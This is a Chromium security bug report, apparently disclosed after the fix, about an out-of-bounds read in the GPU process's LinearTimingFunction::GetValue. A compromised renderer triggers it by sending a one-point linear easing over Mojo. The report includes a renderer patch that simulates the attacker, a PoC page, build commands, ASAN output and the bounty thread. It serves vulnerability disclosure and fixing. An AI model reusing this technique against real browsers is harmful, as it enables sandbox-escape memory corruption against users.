# OOB in LinearTimingFunction::GetValue via Single-Point Linear Easing Deserialization in GPU Process

| Field | Value |
|-------|-------|
| **Issue ID** | [488089244](https://issues.chromium.org/issues/488089244) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P1 |
| **Component** | Internals>Services>Viz |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | zm...@chromium.org |
| **Created** | 2026-02-27 |
| **Bounty** | $3,000.00 |

## Description

# Missing validation of linear timing function point count in Viz process DeserializeTimingFunction leads to OOB read in GPU process

## Summary

`DeserializeTimingFunction()` in the Viz process does not validate that a `linear` timing function received over Mojo IPC contains at least 2 easing points. A compromised renderer can send a `LayerTreeUpdate` containing a 1-point `linear` timing function. When the Viz/GPU process ticks the animation, `LinearTimingFunction::GetValue()` calls `std::prev()` on the begin iterator of a single-element vector, causing an out-of-bounds read. This is a sandbox escape — the memory corruption occurs in the GPU process, triggered from a compromised renderer through `viz.mojom.LayerContext`. The features `TreesInViz` and `kTreeAnimationsInViz` must be enabled (both disabled by default).

## Bisect

Introducing Commit: `63a3937d6059cfad7f4fa91192d1a9726cc80d1c`

- Date: 2024-09-26
- Author: Ken Rockot [rockot@google.com](mailto:rockot@google.com)
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/5875659>

## Root Cause

With `TreesInViz` and `kTreeAnimationsInViz` enabled, the renderer serializes compositor animations into `LayerTreeUpdate` Mojo messages sent to the Viz/GPU process via `viz.mojom.LayerContext::UpdateDisplayTree`. On the Viz side, `DeserializeTimingFunction()` handles the deserialization:

```
// components/viz/service/layers/layer_context_impl.cc
std::unique_ptr<gfx::TimingFunction> DeserializeTimingFunction(
    mojom::TimingFunction& wire) {
  switch (wire.which()) {
    case mojom::TimingFunction::Tag::kLinear: {
      const auto& wire_points = wire.get_linear();
      std::vector<gfx::LinearEasingPoint> points;
      points.reserve(wire_points.size());
      for (const auto& wire_point : wire_points) {
        points.emplace_back(wire_point->in, wire_point->out);
      }
      if (points.empty()) {
        return gfx::LinearTimingFunction::Create();
      }
      return gfx::LinearTimingFunction::Create(std::move(points));
    }
    // ...
  }
}

```

The empty case is handled, but `points.size() == 1` passes through to `LinearTimingFunction::Create()`, which only has a `DCHECK` (no-op in release):

```
// ui/gfx/animation/keyframe/timing_function.cc
std::unique_ptr<LinearTimingFunction> LinearTimingFunction::Create(
    std::vector<LinearEasingPoint> points) {
  DCHECK(points.size() >= 2);
  return base::WrapUnique(new LinearTimingFunction(std::move(points)));
}

```

When the Viz compositor ticks this animation, `GetValue()` assumes at least 2 points:

```
// ui/gfx/animation/keyframe/timing_function.cc
double LinearTimingFunction::GetValue(double input_progress,
                                      LimitDirection limit_direction) const {
  if (IsTrivial()) {
    return input_progress;
  }
  auto it = std::upper_bound(points_.cbegin(), points_.cend(), input_progress,
                             [](double progress, const auto& point) {
                               return 100 * progress < point.input;
                             });
  it = it == points_.cend() ? std::prev(it) : it;
  auto point_a = it == points_.cbegin() ? it : std::prev(it);
  // With points_.size()==1, the next line calls std::prev on cbegin():
  point_a = std::next(point_a) == points_.cend() ? std::prev(point_a) : point_a;
  // ...
}

```

`IsTrivial()` returns false (only true when vector is empty). The iterator arithmetic then moves before `cbegin()`, causing an OOB read.

## Reproduce

Build configuration (`out/asan-release/args.gn`):

```
is_asan = true
is_debug = false
dcheck_always_on = false
is_component_build = true

```
### poc.html

```
<!DOCTYPE html>
<html>
<head>
<title>LinearTimingFunction 1-point OOB</title>
<style>
@keyframes fade {
  from { opacity: 0; }
  to { opacity: 1; }
}
#target {
  width: 200px;
  height: 200px;
  background: red;
  animation: fade 2s ease infinite alternate;
  will-change: opacity;
}
</style>
</head>
<body>
<div id="target"></div>
<script>
console.log("Animation started. Waiting for Viz tick to trigger OOB...");
</script>
</body>
</html>

```
### Source Code Patches

`renderer.patch` modifies `cc/mojo_embedder/viz_layer_context.cc` in the renderer process to simulate a compromised renderer: (1) immediately after `BindLayerContext`, sends a dummy `UpdateDisplayTree` with a minimal valid property tree — both Mojo messages land in the same `ReadAllAvailableMessages()` batch, requiring no timing manipulation; (2) replaces `SerializeTimingFunction` to always emit a 1-point linear timing function; (3) in `SerializeAnimationUpdates`, sends each animated timeline ID twice — first an empty copy (to register with the animation host), then the full version with animations (so `RegisterAnimation` succeeds).

```
diff --git a/cc/mojo_embedder/viz_layer_context.cc b/cc/mojo_embedder/viz_layer_context.cc
index ebcfb3a5c3d2c..dd23529b2a041 100644
--- a/cc/mojo_embedder/viz_layer_context.cc
+++ b/cc/mojo_embedder/viz_layer_context.cc
@@ -14,10 +14,12 @@

 #include "base/check.h"
 #include "base/check_deref.h"
+#include "base/command_line.h"
 #include "base/containers/span.h"
 #include "base/notreached.h"
 #include "base/numerics/safe_conversions.h"
 #include "base/time/time.h"
+#include "base/unguessable_token.h"
 #include "cc/animation/animation.h"
 #include "cc/animation/animation_host.h"
 #include "cc/animation/animation_timeline.h"
@@ -37,9 +38,11 @@
 #include "cc/layers/ui_resource_layer_impl.h"
 #include "cc/layers/view_transition_content_layer_impl.h"
 #include "cc/tiles/picture_layer_tiling.h"
+#include "cc/trees/effect_node.h"
 #include "cc/trees/layer_tree_impl.h"
 #include "cc/trees/property_tree.h"
 #include "components/viz/client/client_resource_provider.h"
+#include "components/viz/common/surfaces/local_surface_id.h"
 #include "gpu/command_buffer/client/shared_image_interface.h"
 #include "services/viz/public/mojom/compositing/layer.mojom.h"
 #include "services/viz/public/mojom/compositing/layer_context.mojom.h"
@@ -1047,7 +1050,7 @@ void SerializeLayer(LayerImpl& layer,
   }
 }

-viz::mojom::TimingStepPosition SerializeTimingStepPosition(
+[[maybe_unused]] viz::mojom::TimingStepPosition SerializeTimingStepPosition(
     gfx::StepsTimingFunction::StepPosition step_position) {
   switch (step_position) {
     case gfx::StepsTimingFunction::StepPosition::START:
@@ -1067,43 +1070,11 @@ viz::mojom::TimingStepPosition SerializeTimingStepPosition(

 viz::mojom::TimingFunctionPtr SerializeTimingFunction(
     const gfx::TimingFunction& fn) {
-  viz::mojom::TimingFunctionPtr wire;
-  switch (fn.GetType()) {
-    case gfx::TimingFunction::Type::LINEAR: {
-      ...
-    }
-    case gfx::TimingFunction::Type::CUBIC_BEZIER: {
-      ...
-    }
-    case gfx::TimingFunction::Type::STEPS: {
-      ...
-    }
-    default:
-      NOTREACHED();
-  }
-  return wire;
+  // [COMPROMISED RENDERER] Replace any timing function with a 1-point linear
+  // to trigger iterator underflow OOB in Viz process GetValue().
+  std::vector<viz::mojom::LinearEasingPointPtr> points;
+  points.push_back(viz::mojom::LinearEasingPoint::New(50.0, 0.5));
+  return viz::mojom::TimingFunction::NewLinear(std::move(points));
 }

@@ -1347,6 +1319,87 @@ VizLayerContext::VizLayerContext(...)
   frame_sink.BindLayerContext(std::move(context), std::move(settings));
+
+  LOG(ERROR) << "PATCH-VERIFY: VizLayerContext constructor running in PID="
+             << getpid() << " process_type="
+             << base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII(
+                    "type");
+
+  // [COMPROMISED RENDERER] Send a dummy UpdateDisplayTree immediately after
+  // BindLayerContext to pre-populate the Viz-side layer tree with a minimal
+  // valid property tree. Both messages land in the same Mojo pipe read batch.
+  {
+    auto dummy = viz::mojom::LayerTreeUpdate::New();
+    dummy->device_viewport = gfx::Rect(0, 0, 800, 600);
+    dummy->page_scale_factor = 1.0f;
+    dummy->min_page_scale_factor = 1.0f;
+    dummy->max_page_scale_factor = 1.0f;
+    dummy->external_page_scale_factor = 1.0f;
+    dummy->device_scale_factor = 1.0f;
+    dummy->painted_device_scale_factor = 1.0f;
+    dummy->next_frame_token = 1;
+    auto lsid = viz::LocalSurfaceId(1, 1, base::UnguessableToken::Create());
+    dummy->current_local_surface_id = lsid;
+    dummy->local_surface_id_from_parent = lsid;
+    dummy->num_transform_nodes = 2;
+    dummy->num_clip_nodes = 2;
+    dummy->num_effect_nodes = 2;
+    dummy->num_scroll_nodes = 2;
+    // ... effect/transform/clip/scroll nodes with id=1, a dummy layer ...
+    service_->UpdateDisplayTree(std::move(dummy));
+  }
 }

@@ -1630,9 +1677,17 @@ void VizLayerContext::SerializeAnimationUpdates(...)
+  // [COMPROMISED RENDERER] Double-timeline trick: send each timeline ID twice.
+  // First empty (registers with host), then with animations.
   std::vector<viz::mojom::AnimationTimelinePtr> timelines;
   for (const auto& [id, timeline] : current_timelines) {
     if (auto wire = MaybeSerializeAnimationTimeline(*timeline)) {
+      if (!wire->new_animations.empty()) {
+        auto empty_wire = viz::mojom::AnimationTimeline::New();
+        empty_wire->id = wire->id;
+        timelines.push_back(std::move(empty_wire));
+      }
       timelines.push_back(std::move(wire));
     }
   }

```

`viz.patch` modifies `components/viz/service/layers/layer_context_impl.cc` in the GPU/Viz process, replacing three `DUMP_WILL_BE_CHECK` calls in `DoDrawInternal` with `LOG_IF(ERROR, ...)`. The severity of `DUMP_WILL_BE_CHECK` depends on the build type:

```
// base/check.cc
LogSeverity GetDumpSeverity() {
#if defined(OFFICIAL_BUILD)
  return DCHECK_IS_ON() ? LOGGING_DCHECK : LOGGING_ERROR;
#else
  return LOGGING_FATAL;
#endif
}

```

In official/release builds it logs at `LOGGING_ERROR` and continues execution; in non-official builds (including ASAN) it uses `LOGGING_FATAL` and terminates the process. Replacing with `LOG_IF(ERROR, ...)` makes the ASAN build behave identically to the official build at these three checkpoints, with no logic changes.

```
diff --git a/components/viz/service/layers/layer_context_impl.cc b/components/viz/service/layers/layer_context_impl.cc
index 6d47015242bf2..a1cccf94528b2 100644
--- a/components/viz/service/layers/layer_context_impl.cc
+++ b/components/viz/service/layers/layer_context_impl.cc
@@ -10,6 +10,7 @@
 #include <utility>
 #include <vector>

+#include "base/command_line.h"
 #include "base/memory/ptr_util.h"
 #include "base/notimplemented.h"
 #include "base/notreached.h"
@@ -2125,7 +2126,12 @@ void LayerContextImpl::DoDrawInternal(...)
   // (crbug.com/454680865): Using DUMP_WILL_BE_CHECK allows all non official
   // builds to fail the check whereas official builds dumps without crashing.
-  DUMP_WILL_BE_CHECK(host_impl_->CanDraw());
+  // In official builds DUMP_WILL_BE_CHECK logs but does not crash.
+  LOG(ERROR) << "PATCH-VERIFY: DoDrawInternal running in PID=" << getpid()
+             << " process_type="
+             << base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII(
+                    "type");
+  LOG_IF(ERROR, !host_impl_->CanDraw()) << "CanDraw() is false";

@@ -2139,12 +2140,12 @@
-  auto draw_result = host_impl_->PrepareToDraw(&frame, expects_to_draw);
+  [[maybe_unused]] auto draw_result =
+      host_impl_->PrepareToDraw(&frame, expects_to_draw);

-  if (expects_to_draw) {
-    DUMP_WILL_BE_CHECK_EQ(draw_result, cc::DrawResult::kSuccess);
-  }
+  LOG_IF(ERROR, draw_result != cc::DrawResult::kSuccess)
+      << "draw_result=" << static_cast<int>(draw_result);

@@ -2158,7 +2159,7 @@
   std::optional<cc::SubmitInfo> submit_info = host_impl_->DrawLayers(&frame);
-  DUMP_WILL_BE_CHECK(submit_info.has_value());
+  LOG_IF(ERROR, !submit_info.has_value()) << "DrawLayers failed";

```

`VizLayerContext` (in `renderer.patch`) compiles into `libcc.dylib` and loads in the renderer process — it is the renderer-side client of `viz.mojom.LayerContext` and is never instantiated in the GPU/Viz process. `LayerContextImpl` (in `viz.patch`) compiles into `libcomponents_viz_service.dylib` and loads in the GPU/Viz process. Both patches include `PATCH-VERIFY` LOG lines that print PID and `process_type` from the command line at runtime, confirming process isolation:

```
[49835:...:ERROR:viz_layer_context.cc:1323] PATCH-VERIFY: VizLayerContext constructor running in PID=49835 process_type=renderer
[49830:...:ERROR:layer_context_impl.cc:2130] PATCH-VERIFY: DoDrawInternal running in PID=49830 process_type=gpu-process
==49830==ERROR: AddressSanitizer: use-after-poison ...

```

PID 49835 is the renderer process (`process_type=renderer`), PID 49830 is the GPU/Viz process (`process_type=gpu-process`). The ASAN crash occurs at PID 49830, confirming the memory corruption is a sandbox escape in the GPU process.

### Build and Run

```
git apply linear-timing-oob/renderer.patch
git apply linear-timing-oob/viz.patch
autoninja -C out/asan-release chrome

ASAN_OPTIONS=detect_odr_violation=0 ./out/asan-release/Chromium.app/Contents/MacOS/Chromium \
  --enable-features=TreesInViz,kTreeAnimationsInViz \
  --enable-logging=stderr \
  --user-data-dir=/tmp/poc-$(date +%s) \
  linear-timing-oob/poc.html

```
### ASAN Output

Crash in the GPU/Viz process (PID 49830, `process_type=gpu-process`, thread T12 VizCompositorThread):

```
[49835:...:ERROR:viz_layer_context.cc:1323] PATCH-VERIFY: VizLayerContext constructor running in PID=49835 process_type=renderer
[49830:...:ERROR:layer_context_impl.cc:2130] PATCH-VERIFY: DoDrawInternal running in PID=49830 process_type=gpu-process
=================================================================
==49830==ERROR: AddressSanitizer: use-after-poison on address 0x60200007b180 at pc 0x00013ee8d128 bp 0x00030baa8260 sp 0x00030baa8258
READ of size 8 at 0x60200007b180 thread T12
    #0 0x00013ee8d124 in gfx::LinearTimingFunction::GetValue(double, gfx::TimingFunction::LimitDirection) const+0x194 (/Users/user/chromium/src/out/asan-release/libui_gfx_animation_keyframe.dylib:arm64+0x25124)
    #1 0x00013ee7bb98 in gfx::KeyframedFloatAnimationCurve::GetTransformedValue(base::TimeDelta, gfx::TimingFunction::LimitDirection) const+0x3d8 (/Users/user/chromium/src/out/asan-release/libui_gfx_animation_keyframe.dylib:arm64+0x13b98)
    #2 0x00013ee690a8 in gfx::FloatAnimationCurve::Tick(base::TimeDelta, int, gfx::KeyframeModel*, gfx::TimingFunction::LimitDirection) const+0x134 (/Users/user/chromium/src/out/asan-release/libui_gfx_animation_keyframe.dylib:arm64+0x10a8)
    #3 0x00013ee6aeb0 in gfx::KeyframeEffect::TickKeyframeModel(base::TimeTicks, gfx::KeyframeModel*)+0x184 (/Users/user/chromium/src/out/asan-release/libui_gfx_animation_keyframe.dylib:arm64+0x2eb0)
    #4 0x000141821230 in cc::KeyframeEffect::Tick(base::TimeTicks)+0xe0 (/Users/user/chromium/src/out/asan-release/libcc_animation.dylib:arm64+0x3d230)
    #5 0x000141809190 in cc::AnimationTimeline::TickTimeLinkedAnimations(std::__Cr::vector<scoped_refptr<cc::Animation>, std::__Cr::allocator<scoped_refptr<cc::Animation>>> const&, base::TimeTicks, bool)+0x1f4 (/Users/user/chromium/src/out/asan-release/libcc_animation.dylib:arm64+0x25190)
    #6 0x0001417f8008 in cc::AnimationHost::TickAnimations(base::TimeTicks, cc::ScrollTree const&, bool)+0x28c (/Users/user/chromium/src/out/asan-release/libcc_animation.dylib:arm64+0x14008)
    #7 0x000109e36430 in cc::LayerTreeHostImpl::AnimateLayers(base::TimeTicks, bool)+0x90 (/Users/user/chromium/src/out/asan-release/libcc.dylib:arm64+0x3fe430)
    #8 0x000109e0dfd8 in cc::LayerTreeHostImpl::AnimateInternal()+0xe8 (/Users/user/chromium/src/out/asan-release/libcc.dylib:arm64+0x3d5fd8)
    #9 0x000109e2813c in cc::LayerTreeHostImpl::WillBeginImplFrame(viz::BeginFrameArgs const&)+0x56c (/Users/user/chromium/src/out/asan-release/libcc.dylib:arm64+0x3f013c)
    #10 0x0001466149e8 in viz::LayerContextImpl::DoDrawInternal(viz::BeginFrameArgs const&, base::TimeTicks, std::__Cr::optional<bool>)+0x3f8 (/Users/user/chromium/src/out/asan-release/libcomponents_viz_service.dylib:arm64+0x3189e8)
    #11 0x0001464fc0d8 in viz::CompositorFrameSinkSupport::OnBeginFrame(viz::BeginFrameArgs const&)+0x860 (/Users/user/chromium/src/out/asan-release/libcomponents_viz_service.dylib:arm64+0x2000d8)
    #12 0x00010632c6d4 in viz::ExternalBeginFrameSource::OnBeginFrame(viz::BeginFrameArgs const&)+0x6c8 (/Users/user/chromium/src/out/asan-release/libviz_common.dylib:arm64+0x106d4)
    #13 0x0001466ace80 in viz::ExternalBeginFrameSourceMac::OnDisplayLinkCallback(ui::VSyncParamsMac)+0x534 (/Users/user/chromium/src/out/asan-release/libcomponents_viz_service.dylib:arm64+0x3b0e80)
    #14 0x0001466af540 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, ui::VSyncParamsMac&&)+0x19c
    #15 0x000106057a08 in base::RepeatingCallback<void (ui::VSyncParamsMac)>::Run(ui::VSyncParamsMac) const &+0x148
    #16 0x00010606fe60 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, ui::VSyncParamsMac&&)+0x1ac
    #17 0x000106057a08 in base::RepeatingCallback<void (ui::VSyncParamsMac)>::Run(ui::VSyncParamsMac) const &+0x148
    #18 0x0001060817dc in ui::VSyncProviderMac::OnVSync(ui::VSyncParamsMac const&, long long)+0x288
    #19 0x0001466b1a10 in viz::ExternalBeginFrameSourceMojoMac::IssueExternalVSync(viz::CADisplayLinkParams const&)+0x138
    #20 0x0001466c309c in viz::mojom::ExternalBeginFrameControllerStubDispatch::Accept(viz::mojom::ExternalBeginFrameController*, mojo::Message*)+0x190
    #21 0x000100acdcac in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x8fc
    #22 0x000100ae3f18 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0
    #23 0x000100ad2ea0 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148
    #24 0x000100af15c4 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(...)+0x650
    #25 0x000100af0058 in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x558
    #26 0x000100ae3f18 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0
    #27 0x000100abaad0 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x394
    #28 0x000100abc208 in mojo::Connector::ReadAllAvailableMessages()+0x23c
    #29 0x000100abbce0 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int)+0xe8
    #30 0x000100abe6a0 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int)+0x1b8
    #31 0x000100abdd54 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x148
    #32 0x000100abdb30 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0
    #33 0x000100f4ae64 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x154
    #34 0x000100f4a880 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x398
    #35 0x000100f4b7c0 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*)+0x184
    #36 0x00010312d804 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348
    #37 0x0001031aae84 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c
    #38 0x0001031aa23c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138
    #39 0x0001033363cc in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8
    #40 0x000103320df8 in base::apple::CallWithEHFrame(void () block_pointer)+0xc
    #41 0x00010333475c in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec
    #42 0x00019c086b10 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18
    #43 0x00019c086aa4 in __CFRunLoopDoSource0+0xa8
    #44 0x00019c086810 in __CFRunLoopDoSources0+0xe4
    #45 0x00019c085464 in __CFRunLoopRun+0x344
    #46 0x00019c084a94 in CFRunLoopRunSpecific+0x238
    #47 0x00019d654c74 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd0
    #48 0x000103337db8 in base::MessagePumpNSRunLoop::DoRun(base::MessagePump::Delegate*)+0xc8
    #49 0x000103333334 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290
    #50 0x0001031ac240 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c
    #51 0x000103098b08 in base::RunLoop::Run(base::Location const&)+0x430
    #52 0x00010324403c in base::Thread::Run(base::RunLoop*)+0xd8
    #53 0x00010324449c in base::Thread::ThreadMain()+0x3d8
    #54 0x0001032b5e54 in base::(anonymous namespace)::ThreadFunc(void*)+0x154
    #55 0x00010133d668 in __sanitizer_weak_hook_memcmp+0x3653c
    #56 0x00019bf9bc08 in _pthread_start+0x84
    #57 0x00019bf96b7c in thread_start+0x4

0x60200007b180 is located 8 bytes after 8-byte region [0x60200007b170,0x60200007b178)
allocated by thread T12 here:
    #0 0x0001013511c0 in operator new(unsigned long)
    #1 0x000141819420 in std::vector<...>::__emplace_back_slow_path<...>()+0xb8
    #2 0x00014180e1b0 in base::ObserverList<cc::KeyframeEffect, ...>::AddObserver(cc::KeyframeEffect*)+0x320
    #3 0x00014180de78 in cc::ElementAnimations::AddKeyframeEffect(cc::KeyframeEffect*)+0x18
    #4 0x0001417f1dfc in cc::AnimationHost::RegisterAnimationForElement(cc::ElementId, cc::Animation*)+0x3c0
    #5 0x000146625734 in viz::(anonymous namespace)::DeserializeAnimationUpdates(viz::mojom::LayerTreeUpdate const&, cc::AnimationHost&)+0x7c8
    #6 0x00014661fe78 in viz::LayerContextImpl::DoUpdateDisplayTree(mojo::StructPtr<viz::mojom::LayerTreeUpdate>)+0x88ec
    #7 0x000146617084 in viz::LayerContextImpl::UpdateDisplayTree(mojo::StructPtr<viz::mojom::LayerTreeUpdate>)+0x1ac
    #8 0x00014673c950 in viz::mojom::LayerContextStubDispatch::Accept(viz::mojom::LayerContext*, mojo::Message*)+0x1fc
    #9 0x000100acdcac in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x8fc
    #10 0x000100ae3f18 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0
    #11 0x000100ad2ea0 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148
    #12 0x000100af15c4 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(...)+0x650
    #13 0x000100af0058 in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x558
    #14 0x000100ae3f18 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0
    #15 0x000100abaad0 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x394
    #16 0x000100abc208 in mojo::Connector::ReadAllAvailableMessages()+0x23c
    #17 0x000100abbce0 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int)+0xe8
    #18 0x000100abe6a0 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int)+0x1b8
    #19 0x000100abdd54 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x148
    #20 0x000100abdb30 in base::internal::Invoker<...>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0
    #21 0x000100f4ae64 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x154
    #22 0x000100f4a880 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x398
    #23 0x000100f4b7c0 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*)+0x184
    #24 0x00010312d804 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348
    #25 0x0001031aae84 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c
    #26 0x0001031aa23c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138
    #27 0x0001033363cc in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8
    #28 0x000103320df8 in base::apple::CallWithEHFrame(void () block_pointer)+0xc
    #29 0x00010333475c in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec

Thread T12 created by T0 here:
    #0 0x000101337760 in pthread_create
    #1 0x0001032b5418 in base::(anonymous namespace)::CreateThread(...)+0x270
    #2 0x000103242d1c in base::Thread::StartWithOptions(base::Thread::Options)+0x498
    #3 0x000131ceb1b4 in viz::VizCompositorThreadRunnerImpl::VizCompositorThreadRunnerImpl()+0x228
    #4 0x000131cf1d4c in viz::VizMainImpl::VizMainImpl(...)+0x7c8
    #5 0x000131569210 in content::GpuChildThread::GpuChildThread(...)+0x1c4
    #6 0x000131568f9c in content::GpuChildThread::GpuChildThread(...)+0x184
    #7 0x0001315708d8 in content::GpuMain(content::MainFunctionParams)+0x788
    #8 0x00013530ac8 in content::RunOtherNamedProcessTypeMain(...)+0x420
    #9 0x0001352eac48 in content::ContentMainRunnerImpl::Run()+0x53c
    #10 0x0001352e6558 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x858
    #11 0x0001352e6a48 in content::ContentMain(content::ContentMainParams)+0x190
    #12 0x00011909f724 in ChromeMain+0x490

SUMMARY: AddressSanitizer: use-after-poison (/Users/user/chromium/src/out/asan-release/libui_gfx_animation_keyframe.dylib:arm64+0x25124) in gfx::LinearTimingFunction::GetValue(double, gfx::TimingFunction::LimitDirection) const+0x194
Shadow bytes around the buggy address:
  0x60200007af00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60200007af80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60200007b000: f7 fa fd fa f7 fa fd fd f7 fa 00 00 f7 fa fd fd
  0x60200007b080: f7 fa fd fd f7 fa fd fd f7 fa fd fa f7 fa fd fd
  0x60200007b100: f7 fa 00 00 f7 fa 00 00 f7 fa 00 00 f7 fa 00 fa
=>0x60200007b180:[f7]fa 00 00 f7 fa 00 00 f7 fa fd fa f7 fa 00 00
  0x60200007b200: f7 fa 00 00 f7 fa 00 fa f7 fa 00 fa f7 fa fd fd
  0x60200007b280: f7 fa fd fd f7 fa fd fa f7 fa 00 00 f7 fa fd fa
  0x60200007b300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60200007b380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60200007b400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==49830==ABORTING

```
## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [README.md](attachments/README.md) (text/markdown, 1.0 KB)
- [asan.log](attachments/asan.log) (text/plain, 126.3 KB)
- [poc.html](attachments/poc.html) (text/html, 441 B)
- [viz.patch](attachments/viz.patch) (text/x-diff, 2.5 KB)
- [renderer.patch](attachments/renderer.patch) (text/x-diff, 7.9 KB)

## Timeline

### li...@chromium.org (2026-02-27)

@jo...@chromium.org do you mind taking a look or rerouting as necessary?

### jo...@chromium.org (2026-02-27)

+zmo@ for TreesInViz

### je...@gmail.com (2026-04-28)

Hello, any update?

### zm...@google.com (2026-05-15)

This is fixed in https://chromium-review.git.corp.google.com/c/chromium/src/+/7807569.

I lost access to b/490963038 and I can't dupe to that bug.

kbr@: any advice what we should do here?

### kb...@google.com (2026-05-22)

Since this bug was reported earler than [Bug 490963038](https://issues.chromium.org/issues/490963038), I duplicated [Bug 490963038](https://issues.chromium.org/issues/490963038) into this one.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure with bisect.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-08-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488089244)*
